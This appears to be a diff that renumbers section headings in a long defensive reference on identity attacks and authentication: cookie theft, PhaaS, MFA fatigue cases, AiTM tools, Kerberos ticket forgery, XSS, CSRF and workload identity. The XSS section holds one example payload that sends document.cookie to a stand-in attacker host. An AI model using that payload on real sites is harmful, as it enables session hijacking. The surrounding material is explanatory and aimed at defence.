 | **Brave** (Chromium-based) | SQLite (`Cookies`) | AES-256-GCM | DPAPI / system keyring | Medium |
 
-##### 21.6.2.1 Cookie Bite Attack (2025)
+##### 22.6.2.1 Cookie Bite Attack (2025)
 
 The "Cookie Bite" attack — identified by Varonis Threat Labs in April 2025 — is a specialised pass-the-cookie technique targeting Azure/Entra ID authentication tokens. The attack specifically extracts two critical cookies:
 
@@ -26062,13 +26064,13 @@ flowchart TD
     style SaaS text-align:left
 ```
 
-##### 21.6.3 Token Marketplace
+##### 22.6.3 Token Marketplace
 
 Stolen cookies and session tokens are commoditised assets traded on dark-web marketplaces and Telegram channels. Genesis Market — the largest marketplace for stolen identity data — was taken down by the FBI in April 2023 (Operation Cookie Monster), but successor marketplaces emerged within weeks. Stolen credentials and session tokens typically appear on underground markets **within 24 hours** of the initial infection.
 
 **Microsoft reported an estimated 39,000 token theft incidents daily** in 2024, and AiTM phishing techniques — which fundamentally function as session token theft — rose **146%** in the same period.
 
-##### 21.6.4 Defenses
+##### 22.6.4 Defenses
 
 | Defense | Mechanism | Effectiveness |
 |:--------|:----------|:-------------|
@@ -26081,7 +26083,7 @@ Stolen cookies and session tokens are commoditised assets traded on dark-web mar
 | **Browser isolation** | Run the browser in an isolated container or VM (e.g., Windows Sandbox, Chrome Remote Desktop session) to limit cookie access from the host system | ✅ Prevents info-stealers running on the host from accessing browser cookie stores |
 | **Application control** (WDAC/AppLocker) | Block execution of unknown or untrusted executables, preventing info-stealer binaries from running | ✅ Stops info-stealers before they can extract cookies, but requires operational overhead for allow-list management |
 
-##### 21.6.5 Exfiltration Techniques
+##### 22.6.5 Exfiltration Techniques
 
 Info-stealers employ a range of techniques to exfiltrate stolen data while evading network-level detection:
 
@@ -26093,7 +26095,7 @@ Info-stealers employ a range of techniques to exfiltrate stolen data while evadi
 
 The use of legitimate services (Telegram, Discord, GitHub) as exfiltration channels is a deliberate tactic that forces defenders into an impossible position: blocking these services causes significant operational disruption, while allowing them provides a free exfiltration path.
 
-##### 21.6.6 Secret Exposure in Code and Repositories
+##### 22.6.6 Secret Exposure in Code and Repositories
 
 Non-human identity credentials (API keys, tokens, connection strings) stored in code repositories create a permanent attack surface — once committed, secrets persist in Git history even after removal. This is a primary initial access vector for both credential stuffing attacks (§22.1.1) and service account takeover (§23.1).
 
@@ -26117,11 +26119,11 @@ Non-human identity credentials (API keys, tokens, connection strings) stored in 
 </details>
 
 #### 22.7 Fraudulent Device Registration
-##### 21.7.1 Attack Mechanism
+##### 22.7.1 Attack Mechanism
 
 The attacker compromises a user's primary credentials (password, in some cases the first MFA factor) and registers their own authenticator device — phone, security key, or software authenticator — as a "legitimate" second factor on the victim's account. This establishes **persistent, MFA-protected access under attacker control**. Unlike token theft (§22.6), which provides temporary access limited by token lifetime, fraudulent device registration gives the attacker a permanent authentication capability indistinguishable from the legitimate user's.
 
-##### 21.7.2 Exploitation Windows
+##### 22.7.2 Exploitation Windows
 
 The attack is most successful during specific account lifecycle events:
 
@@ -26131,7 +26133,7 @@ The attack is most successful during specific account lifecycle events:
 
 **Self-service authenticator management:** If users can add new authenticators to their account without re-authenticating with an existing strong factor, an attacker who has compromised a session token (§22.6) can add their own device silently.
 
-##### 21.7.3 Defenses
+##### 22.7.3 Defenses
 
 | Defense | Mechanism |
 |:--------|:----------|
@@ -26277,7 +26279,7 @@ Cappelli et al. (2007) demonstrated that the complete minutiae set of a fingerpr
 #### 22.10 Phishing-as-a-Service (PhaaS) Ecosystem
 The industrialisation of phishing — the transformation of sophisticated AiTM phishing infrastructure from hand-crafted attack tooling into subscription-based services — represents a fundamental shift in the threat landscape. PhaaS has democratised attacks that were previously the exclusive domain of advanced threat actors, making MFA-bypassing AiTM phishing accessible to any buyer with a few hundred dollars and a Telegram account.
 
-##### 21.10.1 Market Structure
+##### 22.10.1 Market Structure
 
 The PhaaS ecosystem operates on a three-tier model:
 
@@ -26300,7 +26302,7 @@ This three-tier model sits atop a broader supply chain of upstream actors: breac
 | 2023–2024 | Ducktail, VS Code Phishing | Social media vector abuse; developer credential targeting |
 | 2024–2025 | AI-enhanced PhaaS | LLM-generated phishing content; personalised attacks at zero marginal cost |
 
-##### 21.10.2 Pricing Models
+##### 22.10.2 Pricing Models
 
 | Model | Price Range | Description |
 |:------|:-----------|:-----------|
@@ -26334,7 +26336,7 @@ The return on investment for PhaaS operators is substantial: a $500/month subscr
 
 </details>
 
-##### 21.10.3 Infrastructure
+##### 22.10.3 Infrastructure
 
 PhaaS operators leverage legitimate internet infrastructure to make their phishing campaigns more convincing and harder to block:
 
@@ -26343,7 +26345,7 @@ PhaaS operators leverage legitimate internet infrastructure to make their phishi
 - **Throwaway domains** — registered in bulk via privacy-preserving registrars. Domain strategies include typosquatting (`micr0soft-login.com`), homograph attacks (Unicode lookalike characters), and recently expired legitimate domains with residual reputation
 - **URL shorteners and redirectors** — used to obscure the final phishing URL in email links; multiple layers of redirection make URL-based detection difficult
 
-##### 21.10.4 Impact on the Threat Landscape
+##### 22.10.4 Impact on the Threat Landscape
 
 PhaaS has fundamentally altered the economics of identity attacks:
 
@@ -26399,7 +26401,7 @@ Despite these takedowns, the PhaaS ecosystem demonstrates significant resilience
 
 </details>
 
-##### 21.10.5 The Identity Attack Kill Chain
+##### 22.10.5 The Identity Attack Kill Chain
 
 The attacks documented in §22.1–§22.8 do not operate in isolation — they form a **multi-stage kill chain** where each attack type feeds into the next. A typical identity compromise chain in 2024–2025:
 
@@ -26470,7 +26472,7 @@ Defensive strategy must address **every stage** — not just Stage 1. Phishing-r
 #### 22.11 MFA Fatigue Attack Case Studies
 DR-0003's §22.4 covers MFA fatigue attacks at a conceptual level. This section provides detailed case studies of real-world MFA fatigue attacks, including timelines, attack techniques, and the specific mitigations that each victim implemented in response.
 
-##### 21.11.1 Cisco Systems (May 2022)
+##### 22.11.1 Cisco Systems (May 2022)
 
 **Timeline:**
 - **May 2022**: A threat actor (later attributed to the Yanluowang ransomware group) gained access to a Cisco employee's personal Google account via compromised credentials.
@@ -26486,7 +26488,7 @@ DR-0003's §22.4 covers MFA fatigue attacks at a conceptual level. This section 
 - Cisco implemented risk-based MFA policies that flag authentication requests from unusual IP addresses or geographies.
 - Cisco added additional verification for VPN access from non-corporate networks.
 
-##### 21.11.2 Uber (September 2022)
+##### 22.11.2 Uber (September 2022)
 
 **Timeline:**
 - **September 2022**: An attacker obtained an Uber contractor's corporate password, likely from the dark web (the contractor's personal account had been compromised in a previous breach).
@@ -26502,7 +26504,7 @@ DR-0003's §22.4 covers MFA fatigue attacks at a conceptual level. This section 
 - Uber implemented rate limiting on MFA push notifications (max 3 per minute, 10 per hour per account).
 - Uber added a formal process for IT support identity verification (callback to registered number, not accepting inbound calls).
 
-##### 21.11.3 Okta (January 2023)
+##### 22.11.3 Okta (January 2023)
 
 **Timeline:**
 - **January 2023**: Okta disclosed that a threat actor had accessed its support management system by stealing a session cookie from an Okta employee.
@@ -26518,7 +26520,7 @@ DR-0003's §22.4 covers MFA fatigue attacks at a conceptual level. This section 
 - Okta added device fingerprinting to session management.
 - Okta implemented strict screenshot/copy-paste restrictions in its support portal.
 
-##### 21.11.4 Mitigation Playbook
+##### 22.11.4 Mitigation Playbook
 
 | Measure | Effectiveness | Effort | Coverage |
 |:--------|:-------------:|:------:|:--------:|
@@ -26533,7 +26535,7 @@ DR-0003's §22.4 covers MFA fatigue attacks at a conceptual level. This section 
 #### 22.12 Adversary-in-the-Middle Tool Anatomy
 Adversary-in-the-Middle (AiTM) attacks intercept the communication between the user and the authentication system, allowing the attacker to capture credentials and session tokens in real time. Unlike phishing (which captures credentials at a fake login page), AiTM proxies the entire authentication flow to the legitimate server, making the interaction appear completely genuine to the user.
 
-##### 21.12.1 Evilginx Architecture
+##### 22.12.1 Evilginx Architecture
 
 Evilginx (github.com/kgretzky/evilginx2) is the most widely used AiTM tool. It operates as a reverse proxy that sits between the victim's browser and the target IdP.
 
@@ -26548,14 +26550,14 @@ Evilginx (github.com/kgretzky/evilginx2) is the most widely used AiTM tool. It o
 
 **Session token extraction.** Evilginx captures all cookies set by the IdP during the authentication flow. For OIDC-based IdPs, this includes the session cookie (which provides ongoing access) and any access tokens or refresh tokens. For SAML-based IdPs, this includes the SAML assertion (which the attacker can replay to any SP that trusts the IdP).
 
-##### 21.12.2 Modlishka and Muraena
+##### 22.12.2 Modlishka and Muraena
 
 Modlishka and Muraena are AiTM tools that operate similarly to Evilginx but with different design goals:
 
 - **Modlishka** (github.com/drk1wi/Modlishka): Written in Go, Modlishka is designed as a "reverse proxy tool for phishing." It is more modular than Evilginx and can be extended with custom plugins for different IdPs.
 - **Muraena** (github.com/foospidy/Muraena): A Node.js-based AiTM tool optimized for phishing campaigns against OIDC-based IdPs. Muraena includes built-in templates for Microsoft 365, Google Workspace, and Salesforce.
 
-##### 21.12.3 AiTM Detection and Mitigation
+##### 22.12.3 AiTM Detection and Mitigation
 
 | Defense | Mechanism | Effectiveness |
 |:--------|:----------|:-------------:|
@@ -26650,7 +26652,7 @@ flowchart TD
 - **Consent phishing** (row 8): N/A across all methods because consent phishing targets **authorisation** (OAuth consent), not **authentication**. The user authenticates legitimately and then grants permissions to a malicious application — no authentication method prevents the user from clicking "Allow" on a consent screen. Defense is through OAuth governance, not authentication strength
 - **Fraudulent device registration** (row 9): ⚠️ across all MFA methods because the vulnerability is in the **enrollment process**, not in the authentication mechanism itself. If the attacker can complete enrollment (by exploiting a weak enrollment flow), any MFA method they enroll is valid. Defense is through enrollment hardening (§22.7.3), not authentication method selection
 
-##### 21.11.1 Strategic Implications
+##### 23.1.1 Strategic Implications
 
 The matrix reveals two structural conclusions that should drive authentication architecture decisions:
 
@@ -26767,7 +26769,7 @@ NHI authentication events and API access patterns are frequently unmonitored bec
 #### 23.4 Kerberos Ticket Forgery and PAC Exploitation
 Kerberos (§37) underpins Windows domain authentication, and several attack classes exploit the trust model inherent in Kerberos ticket structures. These attacks target the ticket-granting infrastructure rather than individual credentials, enabling domain-wide persistence that is extraordinarily difficult to detect.
 
-##### 21.14.1 AS-REP Roasting
+##### 23.4.1 AS-REP Roasting
 
 AS-REP Roasting exploits accounts configured with `DONT_REQ_PREAUTH` — a flag that disables Kerberos pre-authentication requirements. When this flag is set, any attacker can request an AS-REP for the principal without proving knowledge of the password; the AS-REP contains the session key $K_{c,tgs}$ encrypted with the account's key, enabling an offline dictionary attack.
 
@@ -26782,7 +26784,7 @@ AS-REP Roasting exploits accounts configured with `DONT_REQ_PREAUTH` — a flag 
 
 **Detection:** Event ID 4768 (Kerberos Authentication Ticket Request) with Failure Code 0x0 and Pre-Authentication Type 0 (no pre-auth). **Mitigation:** audit all accounts with `DONT_REQ_PREAUTH` enabled (`Get-ADUser -Filter \{DoesNotRequirePreAuth -eq $true\}`), remove the flag where not explicitly required, enforce AES256 encryption, and apply strong password policies to accounts that must retain the setting.
 
-##### 21.14.2 Golden Ticket Attack
+##### 23.4.2 Golden Ticket Attack
 
 A **Golden Ticket** is a forged TGT created by an attacker who has compromised the krbtgt key. Because the TGT is encrypted with the krbtgt key, the KDC trusts any TGT it can decrypt — making the forged ticket indistinguishable from a legitimately issued TGT.
 
@@ -27067,7 +27069,7 @@ The Target Service consumes the ticket, parsing the PAC authorization data extra
 
 The fundamental problem: the KDC does not maintain a database of issued ticket serial numbers — it only validates the encryption. **Primary mitigation:** double krbtgt password rotation on a regular schedule. After the second rotation, neither the original nor the intermediate key is valid.
 
-##### 21.14.3 Silver Ticket Attack
+##### 23.4.3 Silver Ticket Attack
 
 A **Silver Ticket** is a forged service ticket (as opposed to a forged TGT). The attacker must compromise the target service account's key rather than the krbtgt key — limiting scope to a single service, but the attack is equally difficult to detect:
 
@@ -27118,7 +27120,7 @@ flowchart TD
     style S2 text-align:left
 ```
 
-##### 21.14.4 PAC Vulnerability Summary
+##### 23.4.4 PAC Vulnerability Summary
 
 The Privilege Attribute Certificate (PAC) is Microsoft's Kerberos extension embedding authorisation data into tickets. Several critical CVEs have exploited PAC validation logic:
 
@@ -27134,7 +27136,7 @@ For the full Kerberos protocol treatment, delegation models, and mitigation stra
 #### 23.5 XSS Impact on OAuth Architectures
 Cross-site scripting (XSS) remains the most common web application vulnerability (consistently ranking in the OWASP Top 10). In the context of OAuth authentication, XSS is the primary vector for session compromise because it executes arbitrary JavaScript within the context of the authenticated page. The effectiveness of an XSS attack against an OAuth architecture depends entirely on **what secrets are accessible to JavaScript in the browser context**.
 
-##### 21.15.1 XSS Impact by Architecture
+##### 23.5.1 XSS Impact by Architecture
 
 **Scenario:** An attacker discovers a reflected XSS vulnerability in a comment section and injects `&lt;script>fetch('https://evil.com/steal?data='+document.cookie)&lt;/script>`
 
@@ -27150,7 +27152,7 @@ Cross-site scripting (XSS) remains the most common web application vulnerability
 
 *Low risk is relative — see §23.5.2.
 
-##### 21.15.2 The XSS-with-HttpOnly-Cookie Attack
+##### 23.5.2 The XSS-with-HttpOnly-Cookie Attack
 
 A common misconception is that HttpOnly cookies make XSS "harmless." While HttpOnly prevents direct cookie theft, XSS can still exploit the authenticated session through **request forgery within the same origin**:
 
@@ -27211,7 +27213,7 @@ flowchart TD
     style E2 text-align:left
 ```
 
-##### 21.15.3 Defense-in-Depth: Reducing XSS Impact
+##### 23.5.3 Defense-in-Depth: Reducing XSS Impact
 
 1. **Content Security Policy (CSP)** — the most effective XSS mitigation. A strict CSP with `script-src 'self'` prevents injection of arbitrary scripts. However, CSP bypass techniques exist (JSONP endpoints, DOM clobbering, CSS injection), so CSP should not be the sole defense
 2. **HttpOnly cookies** — eliminate direct token exfiltration via `document.cookie`. The single most impactful defense for OAuth proxy and BFF architectures
@@ -27224,11 +27226,11 @@ flowchart TD
 #### 23.6 CSRF Protection Patterns
 Cross-Site Request Forgery (CSRF) exploits the browser's automatic inclusion of cookies in cross-site requests. In OAuth architectures, CSRF can lead to unauthorised authentication (binding the attacker's IdP account to the victim's RP session), unauthorised logout, or state-changing API operations. The `SameSite` cookie attribute is the primary browser-level CSRF defense, but does not cover all vectors.
 
-##### 21.16.1 OAuth State Parameter
+##### 23.6.1 OAuth State Parameter
 
 The OAuth 2.0 `state` parameter (RFC 6749, §14.12) provides CSRF protection for the authorization flow. The client generates a cryptographically random value, stores it in the user's session, and includes it in the authorization request. The proxy/BFF validates that the `state` in the callback matches the stored value — if they do not match, the proxy rejects the callback (indicating a potential CSRF attack where an attacker initiated their own OAuth flow and attempted to inject their authorization code into the victim's session).
 
-##### 21.16.2 Double-Submit Cookie Pattern
+##### 23.6.2 Double-Submit Cookie Pattern
 
 For AJAX-based requests (where SameSite and OAuth state do not apply), the double-submit cookie pattern provides CSRF protection:
 
@@ -27238,7 +27240,7 @@ For AJAX-based requests (where SameSite and OAuth state do not apply), the doubl
 
 The security relies on the attacker being unable to read or set the CSRF cookie on the victim's domain (enforced by the same-origin policy). An attacker can trigger a cross-site request that includes the cookie, but cannot read the cookie to set the corresponding header.
 
-##### 21.16.3 CSRF Protection per Architecture
+##### 23.6.3 CSRF Protection per Architecture
 
 | Architecture | Primary CSRF Defense | Secondary Defense | OAuth State Required | Notes |
 |:-------------|:--------------------:|:-----------------:|:--------------------:|:------|
@@ -27309,7 +27311,7 @@ Certification (FIPS 140-2/3, Common Criteria, GlobalPlatform) provides assurance
 #### 23.8 MFA Implementation Anti-Patterns
 DR-0003's §23 covers defensive engineering for authentication. This section catalogs the most common anti-patterns observed in production MFA deployments — design decisions that appear to strengthen security but actually weaken it, or that introduce new vulnerabilities.
 
-##### 22.8.1 Anti-Pattern Catalog
+##### 23.8.1 Anti-Pattern Catalog
 
 **1. SMS OTP as MFA.** SMS-based one-time passwords are vulnerable to SIM swap attacks, SS7 protocol exploitation, and real-time phishing (the user is tricked into forwarding the SMS to the attacker). NIST SP 800-63B §6.1.3.2 explicitly restricts SMS OTP to AAL1 (not AAL2). Despite this, many organizations still use SMS OTP as their primary MFA factor.
 
@@ -27369,7 +27371,7 @@ This chapter traces the full spectrum from the foundational OAuth 2.0 Client Cre
 #### 24.1 OAuth 2.0 Client Credentials Grant
 The Client Credentials grant (RFC 6749 §6.4) is the canonical OAuth 2.0 flow for M2M authentication. The client authenticates directly with the authorization server using its own credentials and obtains an access token — no user is involved, no authorization code is exchanged, and no redirect URI is needed.
 
-##### 23.1.1 Protocol Flow
+##### 24.1.1 Protocol Flow
 
 The flow is a single request-response exchange:
 
@@ -27397,7 +27399,7 @@ The authorization server validates the client credentials, evaluates the request
 
 The client uses the access token in subsequent API calls via the `Authorization: Bearer &lt;token>` header. No refresh token is issued — when the access token expires, the client simply requests a new one using the same client credentials.
 
-##### 23.1.2 Client Authentication Methods
+##### 24.1.2 Client Authentication Methods
 
 How the client proves its identity to the authorization server's token endpoint is a critical security decision. RFC 6749 defines the basic mechanisms; OIDC Core §13 and RFC 8705 extend them significantly. The methods form a security spectrum from weakest (shared secrets) to strongest (asymmetric cryptography with hardware-bound keys):
 
@@ -27606,7 +27608,7 @@ Having verified both the signature and the claims, the Authz Server issues an ac
 | **TLS 1.2+ mandatory** | All endpoints MUST use TLS 1.2 or higher with strong cipher suites | Ensures transport confidentiality and integrity |
 | **Restricted response types** | For confidential clients, `response_type=code` is mandatory | Prevents implicit flow vulnerabilities |
 
-##### 23.1.3 Token Scoping and Lifecycle
+##### 24.1.3 Token Scoping and Lifecycle
 
 M2M tokens should follow the principle of least privilege:
 
@@ -27620,7 +27622,7 @@ Standard TLS authenticates the server to the client — the client verifies the 
 
 The protocol mechanics of client certificate authentication at the TLS layer are identical to those described in §10.4 (Certificate-Based Authentication). The critical distinction is the context: §10.4 covers CBA for human users (smart cards, PIV credentials), while this section focuses on mTLS between software services — where the "client" presenting the certificate is an API consumer, a microservice, a CI/CD pipeline, or a workload.
 
-##### 23.2.1 RFC 8705: OAuth 2.0 Mutual-TLS
+##### 24.2.1 RFC 8705: OAuth 2.0 Mutual-TLS
 
 RFC 8705 (February 2020) defines two distinct but complementary uses of mTLS in the OAuth 2.0 framework:
 
@@ -27849,7 +27851,7 @@ Content-Type: application/json
 
 
 
-##### 23.2.2 mTLS in API Gateways
+##### 24.2.2 mTLS in API Gateways
 
 In production architectures, API gateways (Kong, Apigee, Azure API Management, AWS API Gateway) commonly terminate mTLS connections. The gateway:
 
@@ -27866,7 +27868,7 @@ This pattern centralises certificate management and validation at the gateway la
 
 - **Application library** — The application itself terminates mTLS using a TLS library (OpenSSL, BoringSSL, rustls). Provides maximum control and direct certificate access with no additional infrastructure. Trade-off: requires code changes per application, each must implement TLS correctly, and there is no uniform policy enforcement across services
 
-##### 23.2.3 Certificate Lifecycle Challenges
+##### 24.2.3 Certificate Lifecycle Challenges
 
 mTLS in M2M contexts introduces operational challenges distinct from human-facing CBA:
 
@@ -27878,7 +27880,7 @@ mTLS in M2M contexts introduces operational challenges distinct from human-facin
 | **Private key protection** | Client private keys must be protected against extraction | Hardware-bound keys (TPM, HSM), non-exportable key storage, secret management services |
 | **Revocation latency** | CRL distribution has hours-to-days latency; OCSP requires real-time infrastructure | Short-lived certificates make revocation less critical — a compromised certificate expires before a CRL update would propagate |
 
-##### 23.2.4 ACME Protocol for Automated Certificate Management
+##### 24.2.4 ACME Protocol for Automated Certificate Management
 
 The ACME protocol (RFC 8555) automates the process of obtaining, renewing, and revoking TLS certificates. Originally designed for Let's Encrypt (public internet PKI), ACME is increasingly used for **internal PKI management** with private CA servers such as smallstep CA, HashiCorp Vault PKI, and Boulder.
 
@@ -27895,7 +27897,7 @@ The key advantage for M2M authentication: ACME eliminates manual certificate pro
 #### 24.3 SPIFFE and SPIRE: Workload Identity
 **SPIFFE** (Secure Production Identity Framework for Everyone) is a CNCF graduated project that defines a standard for cryptographic workload identity. Where traditional M2M authentication relies on secrets that humans provision and manage (API keys, client secrets, static certificates), SPIFFE provides identities that are **automatically assigned, cryptographically verifiable, and automatically rotated** — no human intervention required after initial configuration.
 
-##### 23.3.1 Core Concepts
+##### 24.3.1 Core Concepts
 
 **SPIFFE ID** — A URI-format identity assigned to a workload:
 
@@ -27927,7 +27929,7 @@ X.509-SVIDs are the primary credential type — they enable transparent mTLS bet
 
 **Trust Bundles** — Each trust domain has a trust bundle: a set of CA certificates that workloads use to validate SVIDs from their own trust domain and from federated trust domains. Trust bundle distribution is automatic — workloads receive updated trust bundles through the same Workload API that delivers SVIDs.
 
-##### 23.3.1.1 X.509-SVID Certificate Structure
+##### 24.3.1.1 X.509-SVID Certificate Structure
 
 An X.509-SVID is a standard X.509 certificate with the SPIFFE ID encoded in the Subject Alternative Name (SAN) extension as a URI:
 
@@ -27950,7 +27952,7 @@ Key structural properties:
 - **Short validity** — SVIDs are typically issued with 1-hour lifetime, limiting the damage window of a compromised certificate
 - **No CRL distribution points** — since SVIDs are short-lived, certificate revocation via CRL is unnecessary. The trust bundle itself is the revocation mechanism: if a workload is removed from SPIRE, its next rotation attempt fails and the existing SVID expires within at most 1 hour
 
-##### 23.3.2 SPIRE Architecture
+##### 24.3.2 SPIRE Architecture
 
 **SPIRE** (SPIFFE Runtime Environment) is the production-grade reference implementation of the SPIFFE standards. Its architecture comprises two components:
 
@@ -28126,7 +28128,7 @@ The application natively reloads the fresh certificate structure in memory, comp
 
 </details>
 
-##### 23.3.3 Attestation Flow
+##### 24.3.3 Attestation Flow
 
 The attestation process is the core security mechanism — it establishes the chain of trust from the hardware/cloud platform through the SPIRE infrastructure to the individual workload.
 
@@ -28190,7 +28192,7 @@ flowchart TD
 
 The SPIRE Agent matches the calling process's selectors against the SPIRE Server's registration entries. If a match is found, the agent requests a signed SVID from the SPIRE Server and delivers it to the workload through the local Unix domain socket.
 
-##### 23.3.4 SVID Lifecycle: Automatic Rotation
+##### 24.3.4 SVID Lifecycle: Automatic Rotation
 
 SPIRE eliminates the certificate lifecycle management burden that plagues traditional mTLS deployments (§24.2.3):
 
@@ -28205,7 +28207,7 @@ SPIRE eliminates the certificate lifecycle management burden that plagues tradit
 
 **Why SPIFFE matters:** It eliminates the three fundamental problems of traditional M2M authentication — (1) long-lived secrets that can be stolen and reused indefinitely, (2) manual credential rotation that is operationally error-prone, and (3) identity assignment that depends on network location rather than cryptographic attestation. SPIFFE replaces all three with short-lived, automatically-rotated, platform-attested cryptographic identities.
 
-##### 23.3.5 Trust Bundle Distribution and Rotation
+##### 24.3.5 Trust Bundle Distribution and Rotation
 
 Each SPIFFE trust domain has a **trust bundle**: a set of X.509 root certificates (and optionally JWT signing keys) that workloads use to validate SVIDs from their own and federated trust domains. Trust bundle distribution follows a push model — the SPIRE Server pushes the current bundle to every SPIRE Agent, which makes it available to workloads via the Workload API.
 
@@ -28220,7 +28222,7 @@ When the CA root certificate is rotated (e.g., annually), the rotation follows a
 
 This strategy ensures workloads continue to trust SVIDs signed by the old CA during the transition, while new SVIDs are signed by the new CA — no disruption to in-flight connections.
 
-##### 23.3.6 SPIFFE Federation
+##### 24.3.6 SPIFFE Federation
 
 SPIFFE federation enables workloads in **different trust domains** to authenticate each other. Federation is based on trust bundle exchange: each trust domain publishes its bundle to other domains, enabling cross-domain SVID validation.
 
@@ -28228,7 +28230,7 @@ The federation flow: (1) Trust Domain A exports its trust bundle to Trust Domain
 
 Federation is particularly valuable in multi-organisation scenarios — a payment processor can federate with multiple merchant trust domains, enabling secure cross-organisation service-to-service authentication without sharing a common CA. It also supports multi-cloud deployments where each cloud region or provider operates its own trust domain.
 
-##### 23.3.7 Production Deployment Patterns
+##### 24.3.7 Production Deployment Patterns
 
 SPIRE supports several deployment topologies for multi-cluster and multi-cloud environments:
 
@@ -28250,7 +28252,7 @@ SPIFFE/SPIRE provides a unified, vendor-neutral identity framework that works ac
 #### 24.4 Service Mesh Identity (Istio, Envoy, Linkerd)
 Service meshes extend the SPIFFE identity model by providing **transparent mTLS** between microservices. Workloads communicate over authenticated, encrypted channels without any application-level code changes — the mesh's sidecar proxy handles certificate management, TLS handshaking, and identity verification on behalf of the application.
 
-##### 23.4.1 Istio
+##### 24.4.1 Istio
 
 Istio (CNCF graduated) is the most widely deployed service mesh. Its security model is built on SPIFFE identities:
 
@@ -28335,7 +28337,7 @@ spec:
 
 This policy restricts access to the payments service's `/api/v1/charges` endpoint — only the `invoice-processor` service account in the `billing` namespace (identified by its SPIFFE ID) is permitted to make POST requests. All other workloads are denied.
 
-##### 23.4.2 Linkerd
+##### 24.4.2 Linkerd
 
 Linkerd (CNCF graduated) takes a zero-configuration approach to service mesh mTLS:
 
@@ -28345,7 +28347,7 @@ Linkerd (CNCF graduated) takes a zero-configuration approach to service mesh mTL
 - **Service Profiles** — Per-route policy and observability (retries, timeouts, traffic splitting) are configured through ServiceProfile resources
 - **Rust proxy** — Linkerd's proxy is written in Rust, providing memory safety guarantees. The proxy binary is approximately 10MB (vs Envoy's 50MB+), translating to lower sidecar overhead: approximately 30MB RAM and ~15m CPU per proxy vs Envoy's ~100MB RAM and ~50m CPU
 
-##### 23.4.3 Envoy Proxy
+##### 24.4.3 Envoy Proxy
 
 Envoy (CNCF graduated) is the data plane proxy used by Istio and other meshes. It handles the mechanics of mTLS:
 
@@ -28369,13 +28371,13 @@ Envoy (CNCF graduated) is the data plane proxy used by Istio and other meshes. I
 
 Consul Connect (HashiCorp) extends the service mesh pattern beyond Kubernetes to VMs and serverless platforms (ECS, Lambda), making it suitable for hybrid environments. Its `Intention` resource provides namespace and service-level authorization, and it integrates natively with HashiCorp Vault for PKI management.
 
-##### 23.4.4 Zero-Trust Networking
+##### 24.4.4 Zero-Trust Networking
 
 Service meshes implement zero-trust at the network layer — every service-to-service call is authenticated (mTLS with identity verification) and authorized (policy enforcement based on workload identity), regardless of network topology. A workload running in the same Kubernetes namespace, the same pod, or even the same container is subject to the same authentication and authorization controls as a workload calling from a different cluster or cloud region.
 
 The shift from network-perimeter security (trust everything inside the firewall) to identity-based security (trust nothing, verify every call) is the defining architectural transition in modern M2M authentication.
 
-##### 23.4.5 Service Mesh vs Standalone SPIFFE/SPIRE
+##### 24.4.5 Service Mesh vs Standalone SPIFFE/SPIRE
 
 A common architectural decision is whether to adopt a service mesh (Istio/Linkerd) or standalone SPIFFE/SPIRE for workload identity. The approaches are not mutually exclusive (Istio can integrate with SPIRE), but the deployment models differ significantly:
 
@@ -28394,7 +28396,7 @@ The choice depends on the deployment context: service meshes are ideal for pure-
 #### 24.5 API Key Patterns and Limitations
 API keys are opaque bearer tokens — typically 32–64 character alphanumeric strings — included in HTTP requests to identify the calling application. They are the most widely deployed credential type in M2M contexts due to their simplicity: generate a key, embed it in a header, and the server validates it against a database lookup.
 
-##### 23.5.1 Typical Usage Patterns
+##### 24.5.1 Typical Usage Patterns
 
 ```
 # Header-based (most common)
@@ -28420,7 +28422,7 @@ API keys serve multiple purposes — often simultaneously and without clear sepa
 | **Usage tracking** | Associates API calls with a customer account for billing and analytics | Cloud provider APIs track consumption per key |
 | **Coarse-grained authorization** | Determines which APIs the key grants access to | Stripe distinguishes between `sk_live_` (live mode) and `sk_test_` (test mode) keys |
 
-##### 23.5.2 Security Limitations
+##### 24.5.2 Security Limitations
 
 API keys have fundamental security properties that make them unsuitable as an authentication mechanism:
 
@@ -28455,7 +28457,7 @@ API keys have fundamental security properties that make them unsuitable as an au
 | **Employee departure** | High | Low–Medium | Offboarding checklist, key rotation |
 | **Container image layers** | Medium | Medium | Multi-stage builds, secret injection at runtime |
 
-##### 23.5.3 API Keys Are Not Authentication
+##### 24.5.3 API Keys Are Not Authentication
 
 **API keys are NOT authentication in the security sense.** They identify a calling application but do not authenticate a principal's identity. The distinction is critical:
 
@@ -28466,7 +28468,7 @@ NIST does not classify API keys as an authentication factor. OWASP's API Securit
 
 **When to use API keys:** Public API rate limiting, usage analytics, developer experience (simple onboarding), and low-sensitivity read-only APIs. For anything requiring actual authentication of the calling service → use OAuth 2.0 Client Credentials (§24.1) or mTLS (§24.2). For anything requiring authentication of a user → use the human authentication mechanisms in §9–§14.
 
-##### 23.5.4 API Key Mitigation Strategies
+##### 24.5.4 API Key Mitigation Strategies
 
 For organisations that must use API keys (e.g., third-party APIs that only support key-based authentication), the following mitigations reduce risk:
 
@@ -28478,7 +28480,7 @@ For organisations that must use API keys (e.g., third-party APIs that only suppo
 6. **Monitor key usage patterns** and alert on anomalies (unusual IP addresses, traffic spikes, new API endpoints)
 7. **Document key ownership** and maintain an inventory of all API keys including purpose, owner, and rotation date
 
-##### 23.5.5 Migration Path from API Keys to Workload Identity
+##### 24.5.5 Migration Path from API Keys to Workload Identity
 
 Migrating from API keys to a proper workload identity mechanism requires a phased approach to minimise disruption:
 
@@ -28492,7 +28494,7 @@ Migrating from API keys to a proper workload identity mechanism requires a phase
 #### 24.6 Cloud-Managed Workload Identity
 Cloud-managed workload identity follows a single architectural principle: the **cloud platform assigns an identity to the workload automatically — no secrets to manage.** The workload obtains access tokens from a platform-local metadata service, authenticating to the platform through its infrastructure identity (VM identity, container identity, managed instance identity) rather than through any application-provisioned credential.
 
-##### 23.6.1 Azure Managed Identity
+##### 24.6.1 Azure Managed Identity
 
 Azure provides two Managed Identity variants:
 
@@ -28546,7 +28548,7 @@ Azure Managed Identity is available for a wide range of resource types:
 
 **Migration pattern:** Replace secrets-manager lookups (e.g., `KeyVault.GetSecret("db-password")`) with Managed Identity authentication using the Azure SDK's `DefaultAzureCredential` class, which automatically chains through Managed Identity, Visual Studio credentials, environment variables, and managed identity as fallback — no credential configuration required in application code.
 
-##### 23.6.2 AWS IAM Roles
+##### 24.6.2 AWS IAM Roles
 
 AWS provides multiple mechanisms for assigning IAM roles to workloads:
 
@@ -28583,7 +28585,7 @@ The EKS OIDC provider issues projected service account tokens that AWS STS excha
 
